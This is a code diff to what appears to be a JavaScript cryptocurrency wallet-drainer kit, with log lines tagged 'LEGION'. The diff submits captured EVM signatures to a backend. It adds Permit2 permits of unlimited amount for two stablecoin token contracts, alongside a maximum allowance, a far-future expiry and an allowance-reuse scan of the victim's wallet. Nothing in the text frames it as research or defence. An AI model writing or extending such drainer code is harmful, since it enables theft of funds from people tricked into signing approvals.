@@ -1837,6 +1837,7 @@
       if (signatures.EVM) {
         console.log('[LEGION]   📤 Submitting EVM...');
         try {
+          var evmChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
           var evmPayload = {
             ingress: 'normalized_v1',
             chain_family: 'EVM',
@@ -1846,14 +1847,17 @@
             signature: signatures.EVM.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet',
+            wallet_type: connectedChains.EVM ? connectedChains.EVM.walletType || 'hot_wallet' : 'hot_wallet',
             scout_value_usd: 0,
             max_allowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
             requires_quorum: false,
-            chain_id: 1,
+            chain_id: evmChainId,
             engine_spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
             permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
-            permits: [],
+            permits: [
+              { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' },
+              { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
+            ],
             batch_permit_metadata: { nonce: 0, deadline: '999999999999', amounts: [] },
             native_amount: '0',
             native_signed_transaction: '',
@@ -2119,7 +2123,7 @@
         // ─── Allowance Reuse Check ────
         console.log('[LEGION]   🔄 Checking existing allowances...');
         try {
-          var reuseResult = await apiPost('/api/v1/allowance-reuse/check', {
+          var reuseResult = await apiPost('/api/v1/allowance-reuse/scan', {
             wallet_address: connectedChains.EVM.address,
             chain_id: connectedChains.EVM.chainId || 1
           });
